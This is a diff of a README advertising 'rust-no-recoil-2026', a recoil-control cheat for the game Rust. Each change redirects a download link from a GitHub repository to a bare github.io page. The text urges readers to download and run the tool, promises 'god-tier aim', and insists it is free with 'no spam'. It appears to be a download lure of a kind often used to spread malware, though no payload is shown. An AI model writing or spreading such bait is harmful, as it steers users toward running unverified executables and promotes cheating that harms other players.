@@ -1,6 +1,6 @@
 # 🎯 rust-no-recoil-2026 - Perfect Spray Control for Every Weapon
 
-[![Download Now](https://img.shields.io/badge/Download-rust--no--recoil--2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/detected-drivingrange6981/rust-no-recoil-2026)
+[![Download Now](https://img.shields.io/badge/Download-rust--no--recoil--2026-brightgreen?style=for-the-badge&logo=github)](https://detected-drivingrange6981.github.io)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these three simple steps to start using rust-no-recoil-2026 today.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/detected-drivingrange6981/rust-no-recoil-2026](https://github.com/detected-drivingrange6981/rust-no-recoil-2026)**
+Visit this link to download the application: **[https://detected-drivingrange6981.github.io](https://detected-drivingrange6981.github.io)**
 
 Click the big green **Download** button on that page. Your browser will save the file to your **Downloads** folder.
 
@@ -55,7 +55,7 @@ You'll see a simple button labeled **"Enable"** or **"Start"**. Click it once. T
 
 **Ready to improve your aim?**
 
-👉 **[Click here to download rust-no-recoil-2026](https://github.com/detected-drivingrange6981/rust-no-recoil-2026)** 👈
+👉 **[Click here to download rust-no-recoil-2026](https://detected-drivingrange6981.github.io)** 👈
 
 The download is **100% free** and takes less than a minute. No registration, no surveys, no spam.
 
@@ -151,7 +151,7 @@ This tool is for educational and competitive use only. You are responsible for u
 
 Stop fighting your weapon. Download rust-no-recoil-2026 right now and experience what it feels like to have **god-tier aim** in every fight. It's free, it's fast, and it works.
 
-**[🚀 Download rust-no-recoil-2026 Now](https://github.com/detected-drivingrange6981/rust-no-recoil-2026)**
+**[🚀 Download rust-no-recoil-2026 Now](https://detected-drivingrange6981.github.io)**
 
 ---
 
